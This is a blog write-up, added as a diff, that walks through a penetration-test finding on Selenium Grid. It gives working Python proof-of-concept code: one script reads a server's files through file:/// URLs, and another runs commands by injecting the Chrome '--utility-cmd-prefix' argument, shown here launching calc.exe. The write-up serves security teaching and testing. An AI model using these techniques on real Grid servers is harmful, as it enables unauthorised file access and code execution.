@@ -1,0 +1,136 @@
+<h2 id="selenium-local-file-inclusion-exploit">Selenium Local File Inclusion Exploit</h2>
+
+<p>Welcome to everybody <a href="https://twitter.com/T3jv1l">@T3jv1l</a> here, and today I’ll talk shortly about selenium. I’ll walk you through a scenario I came across while conducting a penetration test and demonstrate how I obtained Local File Inclusion (LFI) and Remote Code Execution (RCE) in Selenium Grid.</p>
+
+<p>Create a lab setting. From <a href="https://www.java.com/download/ie_manual.jsp">https://www.java.com/download/ie_manual.jsp</a>, install Java. <a href="https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar">https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar</a> is the URL to get the most recent version of Selenium Grid. Download your browser’s webdrive version. If you are unsure of your version, download any version, and then reinstall it after receiving the error message stating you do not have version X installed <a href="https://chromedriver.chromium.org/downloads">https://chromedriver.chromium.org/downloads</a>.</p>
+
+<p>Start Selenium server:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>java <span class="nt">-Dwebdriver</span>.chrome.driver<span class="o">=</span><span class="s2">"C:</span><span class="se">\S</span><span class="s2">elenium</span><span class="se">\c</span><span class="s2">hromedriver.exe"</span> <span class="nt">-jar</span>  C:<span class="se">\U</span>sers<span class="se">\n</span>utcrackers<span class="se">\D</span>ownloads<span class="se">\s</span>elenium-server-standalone-3.141.59.jar
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/headers/selenium/selenium2.png" alt="selenium" /></p>
+
+<p>Everything is all set up. Let’s begin. We will first use Python to set up our webdriver. All of the WebDriver implementations are offered by the <code class="language-plaintext highlighter-rouge">selenium.webdriver</code> module. Firefox, Chrome, and other browsers that use WebDriver are currently supported. We’ll use the following to build the remote Chrome and Firefox instances:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.common.desired_capabilities</span> <span class="kn">import</span> <span class="n">DesiredCapabilities</span>
+
+<span class="c1"># load webdrive module from chrome instance/session
+</span>
+<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Remote</span><span class="p">(</span>
+   <span class="n">command_executor</span><span class="o">=</span><span class="sh">'</span><span class="s">http://192.168.1.130:4444/wd/hub</span><span class="sh">'</span><span class="p">,</span>
+   <span class="n">desired_capabilities</span><span class="o">=</span><span class="n">DesiredCapabilities</span><span class="p">.</span><span class="n">CHROME</span><span class="p">,</span>
+
+<span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">file:///C:/Users/nutcrackers</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># display internal information
+</span><span class="nf">print</span><span class="p">(</span><span class="n">driver</span><span class="p">.</span><span class="n">page_source</span><span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">webdriver.Remote()</code>: Create a new instance of the WebDriver by calling webdriver.Remote() constructor. This allows communication with a remote Selenium server.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">command_executor='http://192.168.1.130:4444/wd/hub'</code>: Specify the URL of the Selenium server to connect to. The provided URL is http://192.168.1.130:4444/wd/hub.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">desired_capabilities=DesiredCapabilities.CHROME</code>: Set the desired capabilities for the WebDriver. In this case, it uses the Chrome browser.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">driver.get("file:///C:/Users/nutcrackers")</code>: Open the specified URL in the browser. In this case, it opens a local file C:/Users/nutcrackers.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">print(driver.page_source)</code>: Retrieve the page source of the loaded web page and print it to the console.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">driver.quit()</code>: Close the browser and terminate the WebDriver session.</p>
+  </li>
+</ul>
+
+<p>Overall, this code sets up a WebDriver instance to connect to a remote Selenium server, opens a local file in the browser, retrieves the page source, and then closes the browser.</p>
+
+<p><img src="/assets/img/headers/selenium/selenium3.png" alt="selenium" /></p>
+
+<p>You can view the entire contents of the server’s <code class="language-plaintext highlighter-rouge">C:/Users/nutcrackers</code> directory if you open the index.html file locally.</p>
+
+<p><img src="/assets/img/headers/selenium/selenium4.png" alt="selenium" /></p>
+
+<h2 id="selenium-remote-code-execution-exploit">Selenium Remote Code Execution Exploit</h2>
+
+<p>The next tactic is remote code execution (RCE). The arguments from the browser must be used to launch powershell.exe or, in this case, a calc.exe. Due to the browser driver being connected to the server, this is quite easy to do.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.common.desired_capabilities</span> <span class="kn">import</span> <span class="n">DesiredCapabilities</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="sh">'</span><span class="s">calc.exe #</span><span class="sh">'</span> <span class="c1">#payload just for POC
+# execute chrome arguments
+</span><span class="n">chrome_options</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">ChromeOptions</span><span class="p">()</span>
+<span class="n">chrome_options</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--no-sandbox</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">chrome_options</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--utility-and-browser</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">chrome_options</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--utility-cmd-prefix=</span><span class="sh">"</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Remote</span><span class="p">(</span>
+   <span class="n">command_executor</span><span class="o">=</span><span class="sh">'</span><span class="s">http://192.168.1.130:4444/wd/hub</span><span class="sh">'</span><span class="p">,</span>
+   <span class="n">desired_capabilities</span><span class="o">=</span><span class="n">DesiredCapabilities</span><span class="p">.</span><span class="n">CHROME</span><span class="p">,</span>
+   <span class="n">options</span><span class="o">=</span><span class="n">chrome_options</span>
+<span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">https://google.com</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>We set the payload:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">payload='calc.exe #'</code>: Define the payload to be executed. In this case, the payload is ‘calc.exe #’. This payload is for Proof of Concept (POC) purposes.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">chrome_options = webdriver.ChromeOptions()</code>: Create an instance of ChromeOptions to configure the Chrome browser.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">chrome_options.add_argument("--no-sandbox")</code>: Add the <code class="language-plaintext highlighter-rouge">--no-sandbox</code> argument to the Chrome options. This argument disables the sandbox mode in Chrome.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">chrome_options.add_argument("--utility-and-browser")</code>: Add the <code class="language-plaintext highlighter-rouge">--utility-and-browser</code> argument to the Chrome options. This argument enables both utility and browser processes in Chrome.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">chrome_options.add_argument("--utility-cmd-prefix="+payload)</code>: Add the <code class="language-plaintext highlighter-rouge">--utility-cmd-prefix</code> argument to the Chrome options and set it to the previously defined payload. This argument specifies the command prefix for utility processes in Chrome.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/img/headers/selenium/selenium5.png" alt="selenium" /></p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://selenium-python.readthedocs.io/getting-started.html#simple-usage">https://selenium-python.readthedocs.io/getting-started.html#simple-usage</a></p>
+
+<p><a href="https://chromedriver.chromium.org/downloads">https://chromedriver.chromium.org/downloads</a></p>
